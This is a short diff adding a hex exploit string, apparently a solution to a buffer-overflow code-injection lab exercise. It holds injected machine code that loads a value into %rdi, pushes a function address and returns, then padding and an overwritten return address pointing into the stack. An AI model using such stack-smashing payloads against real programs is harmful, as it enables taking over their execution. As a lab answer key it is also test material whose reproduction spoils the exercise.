@@ -1,0 +1,7 @@
+48 c7 c7 68 ae 92 4c        /* $0x4c92ae68,%rdi */
+68 21 19 40 00              /* pushq  $0x401921 */
+c3 00 00 00                 /* ret */
+33 33 33 33 33 33 33 33     /* normal content */
+44 44 44 44 44 44 44 44     /* normal content */
+55 55 55 55 55 55 55 55     /* normal content */
+08 05 62 55 00 00 00 00     /* return address: 0x55620508 */
